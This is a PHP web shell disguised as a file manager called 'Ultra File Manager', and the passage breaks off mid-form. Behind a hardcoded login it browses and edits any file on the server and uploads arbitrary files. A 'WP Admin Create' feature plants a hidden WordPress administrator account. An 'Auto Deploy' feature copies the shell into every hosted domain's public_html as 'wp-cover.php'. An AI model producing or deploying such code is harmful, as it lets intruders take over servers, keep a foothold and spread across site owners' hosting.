<?php
session_start();
mb_internal_encoding('UTF-8');
date_default_timezone_set('Asia/Jakarta');

// -------- Konfig --------
define('ALLOW_EDIT_PHP',   true);
define('MAX_EDIT_SIZE',    20000000);
define('UPLOAD_MAX_FILES', 50);
define('CHUNK_SIZE_BYTES', 1048576);
define('CHUNK_TMP_DIR',    '.upload_chunks');

// -------- LOGOUT --------
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// -------- LOGIN HANDLER --------
if (isset($_POST['login'])) {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    if ($user === 'tir' && $pass === '12345') {
        $_SESSION['logged_in'] = true;
        header('Location: ?');
        exit;
    } else {
        $login_error = 'Username atau password salah.';
    }
}

// -------- CEK LOGIN --------
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!doctype html>
    <html lang="id">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Login — Ultra File Manager</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; font-family:Inter, system-ui, sans-serif; }
            body { background:#000; color:#fff; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:24px; }
            .login-card { background:#000; border:1px solid #fff; border-radius:12px; padding:32px 28px; max-width:400px; width:100%; text-align:center; }
            .login-card h1 { font-size:28px; font-weight:700; letter-spacing:2px; margin-bottom:24px; color:#fff; }
            .login-card input { width:100%; padding:10px 14px; margin-bottom:12px; background:transparent; border:1px solid #444; border-radius:10px; color:#fff; font-size:14px; outline:none; }
            .login-card input:focus { border-color:#fff; }
            .login-card .btn { width:100%; padding:10px; background:transparent; border:1px solid #fff; border-radius:10px; color:#fff; font-size:14px; font-weight:600; cursor:pointer; transition:0.2s; }
            .login-card .btn:hover { background:#111; }
            .login-card .error { color:#ff6b6b; font-size:13px; margin-bottom:12px; }
            .login-card .footer { margin-top:16px; font-size:13px; color:#666; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h1>tirz4sec</h1>
            <?php if (isset($login_error)): ?>
                <div class="error"><?= htmlspecialchars($login_error) ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="text" name="username" placeholder="Username" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="login" class="btn">Login</button>
            </form>
            <div class="footer">Access restricted</div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// FUNGSI UTAMA (tanpa owned)
// ============================================================

// Helper: random password (untuk wpadmin)
function generateRandomPassword($length = 12) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    $password = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, $max)];
    }
    return $password;
}

// Fitur: buat admin WordPress (tanpa nuke)
function wp_create_admin_only($dir) {
    $found = false;
    $wp_path = $dir;
    while ($wp_path != '/' && $wp_path != '') {
        if (file_exists($wp_path . '/wp-load.php') || file_exists($wp_path . '/wp-config.php')) {
            $found = true;
            break;
        }
        $wp_path = dirname($wp_path);
    }
    if (!$found || !file_exists($wp_path . '/wp-load.php')) {
        return ['error' => 'WordPress tidak ditemukan.'];
    }

    require_once($wp_path . '/wp-load.php');
    if (!function_exists('wp_create_user')) {
        return ['error' => 'Gagal memuat WordPress.'];
    }

    $username = 'admin_' . substr(md5(time()), 0, 8);
    $password = generateRandomPassword();
    $email = $username . '@' . substr(md5($wp_path), 0, 6) . '.local';

    if (username_exists($username) || email_exists($email)) {
        return ['error' => 'User sudah ada.'];
    }

    $user_id = wp_create_user($username, $password, $email);
    if (is_wp_error($user_id)) {
        return ['error' => $user_id->get_error_message()];
    }

    $user = new WP_User($user_id);
    $user->set_role('administrator');

    return [
        'success' => true,
        'username' => $username,
        'password' => $password,
        'email' => $email,
        'wp_url' => get_site_url()
    ];
}

// Fitur: auto deploy ke semua domain
function auto_deploy_clones($current_dir) {
    $domains_path = $current_dir;
    if (basename($current_dir) !== 'domains') {
        $check = $current_dir;
        while ($check != '/' && $check != '') {
            if (basename($check) === 'domains') {
                $domains_path = $check;
                break;
            }
            $check = dirname($check);
        }
    }
    if (!is_dir($domains_path)) return [];

    $clones = [];
    $items = scandir($domains_path);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $domain_path = $domains_path . '/' . $item;
        if (!is_dir($domain_path)) continue;
        $public = $domain_path . '/public_html';
        if (!is_dir($public)) continue;
        $clone_name = 'wp-cover.php';
        $clone_path = $public . '/' . $clone_name;
        if (copy(__FILE__, $clone_path)) {
            $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
            $domain = $item;
            $url = $protocol . $domain . '/' . $clone_name;
            if (file_exists($public . '/wp-config.php')) {
                $cfg = file_get_contents($public . '/wp-config.php');
                if (preg_match("/define\(\s*['\"]WP_HOME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $cfg, $m)) {
                    $url = rtrim($m[1], '/') . '/' . $clone_name;
                }
            }
            $clones[] = ['domain' => $item, 'path' => $clone_path, 'url' => $url];
        }
    }
    return $clones;
}

// -------- Utils (standar) --------
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES|ENT_SUBSTITUTE, 'UTF-8'); }
function bytes_fmt($b){ $u=['B','KB','MB','GB','TB']; $i=0; while($b>=1024&&$i<count($u)-1){$b/=1024;$i++;} return $i?sprintf('%.1f %s',$b,$u[$i]):sprintf('%d %s',$b,$u[$i]); }
function norm_join($base,$rel){ return $rel===''?$base:rtrim($base,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.ltrim($rel,DIRECTORY_SEPARATOR); }
function resolve_path($input,$fallback){
  $input=(string)$input; $input=str_replace("\0",'',$input);
  if($input==='') return $fallback;
  $candidate=($input[0]===DIRECTORY_SEPARATOR)?$input:norm_join($fallback,$input);
  $rp=realpath($candidate); return $rp!==false?$rp:$fallback;
}
function is_textual_file($file){
  $ext=strtolower(pathinfo($file,PATHINFO_EXTENSION));
  $text=['txt','md','log','json','xml','yml','yaml','ini','env','cfg','conf','cnf','csv','css','scss','less','js','ts','tsx','jsx','html','htm','php','phtml','py','rb','go','java','c','cpp','h','hpp','sh','bash','zsh','bat','ps1','sql','service','unit'];
  if(in_array($ext,$text,true)) return true;
  if(!is_file($file)||filesize($file)===0) return true;
  $fh=@fopen($file,'rb'); if(!$fh) return false;
  $chunk=fread($fh,4096); fclose($fh); if($chunk===false) return false;
  return !preg_match('/[\x00-\x08\x0B\x0C\x0E-\x1F]/',$chunk);
}
function rrmdir_safe($dir){
  if(!is_dir($dir)) return @unlink($dir);
  $scan=@scandir($dir); if($scan===false) return false;
  foreach($scan as $it){
    if($it==='.'||$it==='..') continue;
    $p=$dir.DIRECTORY_SEPARATOR.$it;
    if(is_dir($p)&&!is_link($p)){ if(!rrmdir_safe($p)) return false; }
    else { if(!@unlink($p)) return false; }
  }
  return @rmdir($dir);
}
function flash_set($m){ $_SESSION['flash']=$m; }
function flash_get(){ $m=@$_SESSION['flash']; unset($_SESSION['flash']); return $m; }
function error_then_exit($msg,$code=400){
  http_response_code($code);
  echo '<!doctype html><meta charset="utf-8"><body style="font-family:system-ui;background:#000;color:#fff">';
  echo '<div style="max-width:860px;margin:10vh auto;background:#000;border:1px solid #fff;border-radius:12px;padding:20px">';
  echo '<h3 style="margin:0 0 10px">Error</h3><div style="color:#ffb3b3">'.h($msg).'</div>';
  echo '<div style="margin-top:12px"><a href="?" style="color:#fff;text-decoration:underline">Kembali</a></div></div></body>'; exit;
}
function perms_string($path){
  $p=@fileperms($path); if($p===false) return '???????????';
  switch($p & 0xF000){ case 0xC000:$t='s';break;case 0xA000:$t='l';break;case 0x8000:$t='-';break;case 0x6000:$t='b';break;case 0x4000:$t='d';break;case 0x2000:$t='c';break;case 0x1000:$t='p';break;default:$t='?';}
  $o_r=($p&0x0100)?'r':'-'; $o_w=($p&0x0080)?'w':'-'; $o_x=($p&0x0040)?'x':'-';
  $g_r=($p&0x0020)?'r':'-'; $g_w=($p&0x0010)?'w':'-'; $g_x=($p&0x0008)?'x':'-';
  $a_r=($p&0x0004)?'r':'-'; $a_w=($p&0x0002)?'w':'-'; $a_x=($p&0x0001)?'x':'-';
  if($p&0x0800) $o_x=($o_x==='x')?'s':'S';
  if($p&0x0400) $g_x=($g_x==='x')?'s':'S';
  if($p&0x0200) $a_x=($a_x==='x')?'t':'T';
  return $t.$o_r.$o_w.$o_x.$g_r.$g_w.$g_x.$a_r.$a_w.$a_x;
}
function save_uploaded_to($tmp, $dest){
  if (@move_uploaded_file($tmp, $dest)) return true;
  if (@rename($tmp, $dest)) return true;
  if (@copy($tmp, $dest)) return true;
  $in = @fopen($tmp, 'rb');
  if ($in) {
    $out = @fopen($dest, 'wb');
    if ($out) {
      $ok = @stream_copy_to_stream($in, $out);
      @fclose($out); @fclose($in);
      if ($ok !== false) return true;
    } else { @fclose($in); }
  }
  return false;
}

// -------- Lokasi awal --------
$ROOT = DIRECTORY_SEPARATOR;
$START = realpath(__DIR__) ?: $ROOT;

// -------- Resolve CURRENT --------
$path_in = isset($_GET['path'])?(string)$_GET['path']:'';
$goto_in = isset($_GET['goto'])?(string)$_GET['goto']:'';
$seed = $path_in!==''?$path_in:($goto_in!==''?$goto_in:'');
$CURRENT = $seed===''?$START:resolve_path($seed,$START);
if(!is_dir($CURRENT)) $CURRENT = dirname($CURRENT);

// ============================================================
// HANDLER UNTUK FITUR BARU (wpadmin & auto_deploy)
// ============================================================
if (isset($_GET['wpadmin'])) {
    $result = wp_create_admin_only($CURRENT);
    if (isset($result['error'])) {
        flash_set('Error: ' . $result['error']);
    } else {
        flash_set('Admin created: ' . $result['username'] . ' | Pass: ' . $result['password'] . ' | Login: ' . $result['wp_url'] . '/wp-admin');
    }
    header('Location: ?path=' . rawurlencode($CURRENT));
    exit;
}

if (isset($_GET['auto_deploy'])) {
    $clones = auto_deploy_clones($CURRENT);
    if (count($clones) > 0) {
        $_SESSION['deployed_clones'] = $clones;
        flash_set('Deployed ' . count($clones) . ' clones.');
    } else {
        flash_set('Tidak ada domain dengan public_html ditemukan.');
    }
    header('Location: ?path=' . rawurlencode($CURRENT));
    exit;
}

// ====== HANDLER: CHUNKED UPLOAD (tanpa owned) ======
if (($_SERVER['REQUEST_METHOD']==='POST') && isset($_GET['chunk'])) {
  $uploadId = $_POST['upload_id'] ?? '';
  $fileName = $_POST['file_name'] ?? '';
  $idx      = isset($_POST['chunk_index']) ? (int)$_POST['chunk_index'] : -1;
  $total    = isset($_POST['total_chunks']) ? (int)$_POST['total_chunks'] : -1;
  if ($uploadId==='' || $fileName==='' || $idx<0 || $total<1) {
    http_response_code(400); echo 'bad params'; exit;
  }
  if(!is_dir($CURRENT)||!is_writable($CURRENT)) { http_response_code(403); echo 'dir not writable'; exit; }

  $tmpDir = rtrim($CURRENT,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.CHUNK_TMP_DIR;
  if (!is_dir($tmpDir)) { @mkdir($tmpDir, 0775, true); }
  if (!is_dir($tmpDir) || !is_writable($tmpDir)) { http_response_code(500); echo 'tmp not writable'; exit; }

  $chunkField = 'chunk';
  if (!isset($_FILES[$chunkField]) || $_FILES[$chunkField]['error']!==UPLOAD_ERR_OK) {
    http_response_code(400); echo 'no chunk'; exit;
  }
  $chunkPath = $tmpDir.DIRECTORY_SEPARATOR.$uploadId.'.part.'.$idx;
  if (!save_uploaded_to($_FILES[$chunkField]['tmp_name'], $chunkPath)) {
    http_response_code(500); echo 'save fail'; exit;
  }
  $done = true;
  for ($i=0; $i<$total; $i++){
    if (!file_exists($tmpDir.DIRECTORY_SEPARATOR.$uploadId.'.part.'.$i)) { $done=false; break; }
  }
  if ($done) {
    $safeName = basename($fileName);
    $final = rtrim($CURRENT,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$safeName;
    if (file_exists($final)) {
      $pi = pathinfo($final);
      $base = $pi['filename'] ?? $safeName;
      $ext  = isset($pi['extension']) && $pi['extension'] !== '' ? ('.'.$pi['extension']) : '';
      $k=1; do { $final = $pi['dirname'].DIRECTORY_SEPARATOR.$base.' ('.$k.')'.$ext; $k++; } while(file_exists($final) && $k<1000);
    }
    $out = @fopen($final, 'wb');
    if (!$out) { http_response_code(500); echo 'assemble open fail'; exit; }
    for ($i=0; $i<$total; $i++){
      $part = $tmpDir.DIRECTORY_SEPARATOR.$uploadId.'.part.'.$i;
      $in = @fopen($part, 'rb'); if(!$in){ @fclose($out); http_response_code(500); echo 'assemble read fail'; exit; }
      @stream_copy_to_stream($in, $out); @fclose($in); @unlink($part);
    }
    @fclose($out);
    @rmdir($tmpDir);
  }
  header('Content-Type: application/json');
  echo json_encode(['ok'=>true,'assembled'=>($done?true:false)]);
  exit;
}

// -------- Aksi POST (normal form) tanpa owned --------
if($_SERVER['REQUEST_METHOD']==='POST' && !isset($_GET['chunk'])){
  $action = $_POST['action'] ?? '';

  if($action==='upload'){
    if(!is_dir($CURRENT)||!is_writable($CURRENT)) error_then_exit('Folder tidak bisa ditulisi.',403);
    if(!isset($_FILES['files'])) error_then_exit('Tidak ada file yang diupload.');
    $count=min(count($_FILES['files']['name']),UPLOAD_MAX_FILES); $ok=0;$fail=0;$msgs=[];
    for($i=0;$i<$count;$i++){
      $err = $_FILES['files']['error'][$i] ?? UPLOAD_ERR_NO_FILE;
      $name = basename($_FILES['files']['name'][$i] ?? 'unknown');
      $tmp  = $_FILES['files']['tmp_name'][$i] ?? '';
      if($err!==UPLOAD_ERR_OK || !is_uploaded_file($tmp)){
        $fail++; $msgs[]='Gagal upload: '.h($name).' (error='.$err.')'; continue;
      }
      $dest = rtrim($CURRENT,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$name;
      $parentReal = realpath(dirname($dest));
      if($parentReal===false){ $fail++; $msgs[]="Path tidak valid: ".h($name); continue; }
      if (file_exists($dest)) {
        $pi = pathinfo($dest);
        $base = $pi['filename'] ?? $name;
        $ext  = isset($pi['extension']) && $pi['extension'] !== '' ? ('.'.$pi['extension']) : '';
        $k=1; do { $dest = $pi['dirname'].DIRECTORY_SEPARATOR.$base.' ('.$k.')'.$ext; $k++; } while(file_exists($dest) && $k<1000);
      }
      if (save_uploaded_to($tmp, $dest)) {
        $ok++;
      } else { $fail++; $msgs[]="Gagal simpan: ".h($name); }
    }
    flash_set("Upload selesai. Berhasil: $ok, Gagal: $fail".(count($msgs)?' ('.implode('; ',$msgs).')':''));
    header('Location: ?path='.rawurlencode($CURRENT)); exit;
  }

  if($action==='save'){
    $filePath=$_POST['file_path'] ?? '';
    $abs=resolve_path($filePath,$CURRENT);
    if(!is_file($abs)||!is_writable($abs)) error_then_exit('File tidak bisa disimpan atau tidak ada izin.',403);
    $ext=strtolower(pathinfo($abs,PATHINFO_EXTENSION));
    if(!ALLOW_EDIT_PHP&&$ext==='php') error_then_exit('Edit .php dimatikan (konfig).');
    if(!is_textual_file($abs)) error_then_exit('File bukan teks.');
    if(filesize($abs)>MAX_EDIT_SIZE) error_then_exit('File terlalu besar untuk editor web.');
    $content=(string)($_POST['content'] ?? '');
    $content=str_replace("\r\n","\n",$content);
    if(@file_put_contents($abs,$content)===false) error_then_exit('Gagal menyimpan file.');
    flash_set('Perubahan disimpan.');
    header('Location: ?path='.rawurlencode(dirname($abs))); exit;
  }

  if($action==='rename'){
    $oldPath=$_POST['old_path'] ?? '';
    $newName=trim((string)($_POST['new_name'] ?? ''));
    $oldAbs=resolve_path($oldPath,$CURRENT);
    if(!file_exists($oldAbs)) error_then_exit('Target tidak ditemukan.');
    if($newName===''||preg_match('/[\/\\\\]/',$newName)) error_then_exit('Nama baru tidak valid.');
    $newAbs=dirname($oldAbs).DIRECTORY_SEPARATOR.$newName;
    if(file_exists($newAbs)) error_then_exit('Nama sudah digunakan.');
    if(!@rename($oldAbs,$newAbs)) error_then_exit('Gagal rename.');
    flash_set('Berhasil rename.');
    header('Location: ?path='.rawurlencode(dirname($newAbs))); exit;
  }

  if($action==='delete'){
    $targetPath=$_POST['target_path'] ?? '';
    $targetAbs=resolve_path($targetPath,$CURRENT);
    if(!file_exists($targetAbs)) error_then_exit('Target tidak ditemukan.');
    if(!rrmdir_safe($targetAbs)) error_then_exit('Gagal menghapus (cek permission).');
    flash_set('Berhasil hapus.');
    header('Location: ?path='.rawurlencode(dirname($targetAbs))); exit;
  }

  if($action==='create_folder'){
    $folderName = trim((string)($_POST['folder_name'] ?? ''));
    if($folderName==='' || preg_match('/[\/\\\\]/',$folderName)) error_then_exit('Nama folder tidak valid.');
    if(!is_dir($CURRENT) || !is_writable($CURRENT)) error_then_exit('Folder tidak bisa ditulisi.',403);
    $newPath = rtrim($CURRENT,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$folderName;
    if(file_exists($newPath)) error_then_exit('Folder atau file dengan nama tersebut sudah ada.');
    if(!@mkdir($newPath, 0775)) error_then_exit('Gagal membuat folder.');
    flash_set('Folder berhasil dibuat: '.h($folderName));
    header('Location: ?path='.rawurlencode($CURRENT));
    exit;
  }

  if($action==='create_file'){
    $fileName = trim((string)($_POST['file_name'] ?? ''));
    $content  = (string)($_POST['file_content'] ?? '');
    if($fileName==='' || preg_match('/[\/\\\\]/',$fileName)) error_then_exit('Nama file tidak valid.');
    if(!is_dir($CURRENT) || !is_writable($CURRENT)) error_then_exit('Folder tidak bisa ditulisi.',403);
    $newPath = rtrim($CURRENT,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$fileName;
    if(file_exists($newPath)) error_then_exit('File dengan nama tersebut sudah ada.');
    $content = str_replace("\r\n","\n",$content);
    if(@file_put_contents($newPath, $content)===false) error_then_exit('Gagal membuat file.');
    flash_set('File berhasil dibuat: '.h($fileName));
    header('Location: ?path='.rawurlencode($CURRENT));
    exit;
  }

  error_then_exit('Aksi tidak dikenal.');
}

// -------- Listing (tanpa owned) --------
$items=[]; $scan=@scandir($CURRENT);
if($scan!==false){
  foreach($scan as $it){
    if($it==='.'||$it==='..') continue;
    $p=rtrim($CURRENT,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$it;
    $items[]=[
      'name'=>$it,
      'is_dir'=>is_dir($p),
      'size'=>is_dir($p)?0:(int)@filesize($p),
      'mtime'=>(int)@filemtime($p),
      'abs'=>$p,
      'perm'=>perms_string($p),
    ];
  }
  usort($items,function($a,$b){
    if($a['is_dir']!==$b['is_dir']) return $a['is_dir']?-1:1;
    return strcasecmp($a['name'],$b['name']);
  });
}

// -------- Breadcrumb --------
function make_breadcrumb($CURRENT){
  $parts=[]; $path=$CURRENT;
  while(true){
    $parent=dirname($path);
    if($parent===$path){ array_unshift($parts,['label'=>'/','path'=>'/']); break; }
    array_unshift($parts,['label'=>basename($path),'path'=>$path]);
    $path=$parent;
  }
  return $parts;
}
$crumbs=make_breadcrumb($CURRENT);
$canUp=dirname($CURRENT)!==$CURRENT;

// -------- Mode edit? --------
$editFile=null;
if(isset($_GET['edit'])){
  $editIn=(string)$_GET['edit']; $editAbs=resolve_path($editIn,$CURRENT);
  if($editAbs && is_file($editAbs)){
    $size=(int)@filesize($editAbs);
    if($size<=MAX_EDIT_SIZE && is_textual_file($editAbs)){ $editFile=['abs'=>$editAbs,'size'=>$size]; }
  }
}

// -------- System info --------
$serverIP=$_SERVER['SERVER_ADDR']??gethostbyname(gethostname());
$clientIP=$_SERVER['REMOTE_ADDR']??'N/A'; $hostname=gethostname(); $phpv=PHP_VERSION;

// -------- Flash --------
$flash=flash_get();

// ============================================================
// UI RENDER (tanpa owned badge)
// ============================================================
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ultra File Manager</title>
<style>
:root{
  --bg:#000; --card:#000; --text:#fff; --muted:#cfcfcf; --line:#fff; --accent:#fff; --danger:#ff6b7a;
}
*{box-sizing:border-box}
html,body{height:100%}
body{margin:0;font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,Ubuntu,sans-serif;background:var(--bg);color:var(--text)}
.container{width:100%;max-width:none;margin:0;padding:12px}
.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px}
.header{display:flex;flex-wrap:wrap;gap:10px;align-items:center;justify-content:space-between}
.breadcrumb{display:flex;gap:8px;align-items:center;max-width:100%;overflow:auto;white-space:nowrap;padding-bottom:4px}
.breadcrumb a{color:var(--accent);text-decoration:none;font-weight:600;border-bottom:1px dotted transparent}
.breadcrumb a:hover{border-bottom-color:var(--accent)}
.breadcrumb span{color:var(--muted)}
.pills{display:flex;gap:8px;flex-wrap:wrap}
.pill{background:transparent;border:1px solid var(--line);border-radius:999px;padding:6px 10px;font-size:12px;color:var(--text)}
.actions{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
.iconbtn{border:1px solid var(--line);background:transparent;border-radius:10px;padding:8px;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;text-decoration:none;color:var(--text);width:36px;height:36px}
.iconbtn:hover{background:#111}
.iconbtn.danger{border-color:var(--line);color:var(--danger)}
.icon{width:18px;height:18px;display:block;stroke:var(--text)}
.flash{border:1px solid var(--line);background:#0a0a0a;border-radius:8px;padding:10px;margin:10px 0;color:var(--text)}
.sep{opacity:.6}
.small{font-size:12px;color:var(--muted)}
.table-wrap{width:100%;overflow-x:auto}
.table{width:100%;border-collapse:collapse;margin-top:10px}
.table th,.table td{padding:10px;border-bottom:1px solid var(--line);font-size:14px;vertical-align:middle}
.table th{color:var(--text);text-align:left}
.namecell{min-width:0;word-break:break-all;overflow-wrap:anywhere}
.namecell a{color:var(--accent);text-decoration:none}
.permcell{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;color:var(--text)}
.rowacts{display:flex;gap:6px;align-items:center;min-width:0;flex-wrap:wrap}
.rowacts input[type="text"]{background:transparent;border:1px solid var(--line);border-radius:10px;color:var(--text);padding:8px;width:180px;max-width:45vw}
.rowacts input[type="text"]::placeholder{color:#aaa}
input[type="file"]{color:var(--text)}
textarea{
  width:100%; min-height:80vh; background:transparent; color:var(--text);
  border:1px solid var(--line); border-radius:10px; padding:12px;
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:14px; line-height:1.5; outline:none;
}
textarea:focus{box-shadow:0 0 0 2px rgba(255,255,255,.2) inset}
@media (max-width: 1024px){ .rowacts input[type="text"]{width:140px} }
@media (max-width: 720px){ .rowacts input[type="text"]{width:110px} }
</style>
</head>
<body>
<div class="container">
  <svg style="display:none" xmlns="http://www.w3.org/2000/svg">
    <symbol id="ico-up" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19V5"/><path d="m5 12 7-7 7 7"/></symbol>
    <symbol id="ico-reload" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-3-6.7"/><path d="M21 3v6h-6"/></symbol>
    <symbol id="ico-goto" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></symbol>
    <symbol id="ico-upload" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12"/><path d="m7 8 5-5 5 5"/><path d="M20 21H4"/></symbol>
    <symbol id="ico-edit" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4 12.5-12.5z"/></symbol>
    <symbol id="ico-rename" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"/><path d="M8 6v12"/></symbol>
    <symbol id="ico-delete" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M4 6h16"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></symbol>
    <symbol id="ico-folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></symbol>
    <symbol id="ico-file" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></symbol>
    <symbol id="ico-save" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21H5a2 2 0 0 1-2-2V7l4-4h10l4 4v12a2 2 0 0 1-2 2z"/><path d="M12 17v-6"/><path d="M7 7h10"/></symbol>
    <symbol id="ico-cancel" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6 6 18M6 6l12 12"/></symbol>
  </svg>

  <div class="card">
    <div class="header">
      <div>
        <div class="breadcrumb">
          <?php
            function breadcrumb($crumbs,$CURRENT){
              foreach($crumbs as $i=>$c){
                if($i>0) echo '<span class="sep">/</span>';
                if($c['path']===$CURRENT) echo '<span>'.($c['label']==='/'?'/':h($c['label'])).'</span>';
                else echo '<a href="?path='.rawurlencode($c['path']).'">'.($c['label']==='/'?'/':h($c['label'])).'</a>';
              }
            }
            breadcrumb($crumbs,$CURRENT);
          ?>
        </div>
        <div class="pills" style="margin-top:8px">
          <div class="pill">Server: <?=h($hostname)?> (<?=h($serverIP)?>)</div>
          <div class="pill">You: <?=h($clientIP)?></div>
          <div class="pill">PHP <?=h($phpv)?></div>
          <div class="pill"><span class="small">Dir:</span> <span class="small"><?=h($CURRENT)?></span></div>
          <div class="pill"><a href="?logout=1" style="color:var(--danger);text-decoration:none;">Logout</a></div>
        </div>
      </div>
      <div class="actions">
        <?php if($canUp): ?>
          <a class="iconbtn" title="Naik satu level" href="?path=<?=rawurlencode(dirname($CURRENT))?>"><svg class="icon"><use href="#ico-up"/></svg></a>
        <?php endif; ?>
        <a class="iconbtn" title="Muat ulang" href="?path=<?=rawurlencode($CURRENT)?>"><svg class="icon"><use href="#ico-reload"/></svg></a>
        <form method="get" class="rowacts" title="Pergi ke path">
          <input type="text" name="goto" placeholder="/etc /var/log ./subdir">
          <button class="iconbtn" type="submit"><svg class="icon"><use href="#ico-goto"/></svg></button>
        </form>
      </div>
    </div>

    <?php if($flash): ?><div class="flash"><?= $flash ?></div><?php endif; ?>

    <?php if($editFile): ?>
      <h3 style="margin:6px 0 10px">Edit: <span class="small"><?=h($editFile['abs'])?></span></h3>
      <form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file_path" value="<?=h($editFile['abs'])?>">
        <textarea name="content"><?php
          $content=@file_get_contents($editFile['abs']);
          echo htmlspecialchars($content===false?'':$content, ENT_NOQUOTES|ENT_SUBSTITUTE,'UTF-8');
        ?></textarea>
        <div style="margin-top:10px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
          <button class="iconbtn" title="Simpan perubahan" type="submit"><svg class="icon"><use href="#ico-save"/></svg></button>
          <a class="iconbtn" title="Batal" href="?path=<?=rawurlencode(dirname($editFile['abs']))?>"><svg class="icon"><use href="#ico-cancel"/></svg></button>
          <span class="small">Ukuran: <?=bytes_fmt($editFile['size'])?></span>
        </div>
      </form>
    <?php else: ?>

      <!-- ====== TOMBOL FITUR BARU ====== -->
      <div style="display:flex; flex-wrap:wrap; gap:10px; margin:8px 0;">
        <a href="?wpadmin=1&path=<?=rawurlencode($CURRENT)?>" class="iconbtn" style="padding:8px 16px; width:auto; border-color:#fff;">
          WP Admin Create
        </a>
        <a href="?auto_deploy=1&path=<?=rawurlencode($CURRENT)?>" class="iconbtn" style="padding:8px 16px; width:auto; border-color:#fff;">
          Auto Deploy
        </a>
      </div>

      <!-- Upload -->
      <div class="card" style="margin:8px 0; padding:12px">
        <h3 style="margin:0 0 10px">Upload</h3>
        <form method="post" enctype="multipart/form-data" style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
          <input type="hidden" name="action" value="upload">
          <input type="file" id="fileInput" name="files[]" multiple>
          <div class="small" style="color:var(--muted)">Maks <?=UPLOAD_MAX_FILES?> file per unggah.</div>
          <button class="iconbtn" title="Unggah (form)" type="submit"><svg class="icon"><use href="#ico-upload"/></svg></button>
        </form>
        <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:8px">
          <button class="iconbtn" id="btnChunkUpload" title="Unggah via chunk" type="button">
            <svg class="icon"><use href="#ico-upload"/></svg>
          </button>
          <span class="small" id="chunkStatus" style="color:var(--muted)"></span>
        </div>
      </div>

      <!-- Buat Folder & File -->
      <div class="card" style="margin:8px 0; padding:12px;">
        <form method="post" style="display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
          <input type="hidden" name="action" value="create_folder">
          <input type="text" name="folder_name" placeholder="Nama folder" required style="background:transparent;border:1px solid var(--line);border-radius:10px;color:var(--text);padding:8px;width:200px;">
          <button type="submit" style="background:transparent;border:1px solid var(--line);border-radius:10px;padding:8px 16px;color:var(--text);cursor:pointer;">Buat Folder</button>
        </form>
      </div>

      <div class="card" style="margin:8px 0; padding:12px;">
        <form method="post" style="display:flex; flex-direction:column; gap:8px;">
          <input type="hidden" name="action" value="create_file">
          <div style="display:flex; gap:8px; flex-wrap:wrap;">
            <input type="text" name="file_name" placeholder="Nama file (misal: catatan.txt)" required style="background:transparent;border:1px solid var(--line);border-radius:10px;color:var(--text);padding:8px;flex:1;">
          </div>
